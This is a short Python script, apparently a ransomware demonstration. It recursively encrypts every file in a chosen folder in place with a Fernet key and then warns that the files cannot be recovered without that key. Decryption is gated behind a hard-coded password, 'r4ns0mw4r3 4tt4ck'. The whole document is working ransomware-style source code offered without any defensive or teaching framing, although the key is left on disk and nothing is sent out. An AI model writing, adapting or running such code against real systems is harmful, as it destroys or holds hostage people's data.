from cryptography.fernet import Fernet
import os

TARGET_FOLDER = "full/path/to/your/target/directory" 

# Generate and save the encryption key
def generate_key():
    key = Fernet.generate_key()
    with open("encryption_key.key", "wb") as key_file:
        key_file.write(key)
    return key

# Load the encryption key
def load_key():
    with open("encryption_key.key", "rb") as key_file:
        return key_file.read()

# Encrypt/decrypt files in a directory
def encrypt_files(directory, key):
    fernet = Fernet(key)
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as f:
                    data = f.read()
                encrypted_data = fernet.encrypt(data)
                with open(file_path, "wb") as f:
                    f.write(encrypted_data)
                print(f"Encrypted: {file_path}")
            except Exception as e:
                print(f"Failed to encrypt {file_path}: {e}")

def decrypt_files(directory, key):
    fernet = Fernet(key)
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as f:
                    encrypted_data = f.read()
                decrypted_data = fernet.decrypt(encrypted_data)
                with open(file_path, "wb") as f:
                    f.write(decrypted_data)
                print(f"Decrypted: {file_path}")
            except Exception as e:
                print(f"Failed to decrypt {file_path}: {e}")

# Check password for decryption
def check_password():
    correct_password = "r4ns0mw4r3 4tt4ck"
    user_password = input("Enter password to decrypt files: ").strip()
    if user_password == correct_password:
        print("Password correct. Decrypting files...")
        return True
    else:
        print("Incorrect password. Decryption failed.")
        return False

if __name__ == "__main__":
    key = generate_key()
    print(f"Encryption key saved to 'encryption_key.key'.")
    encrypt_files(TARGET_FOLDER, key)
    print("\n**Important**: Save your decryption key. Without it, your files cannot be recovered!")
    while True:
        if check_password():
            key = load_key()
            decrypt_files(TARGET_FOLDER, key)
            break
        else:
            print("Decryption aborted.")
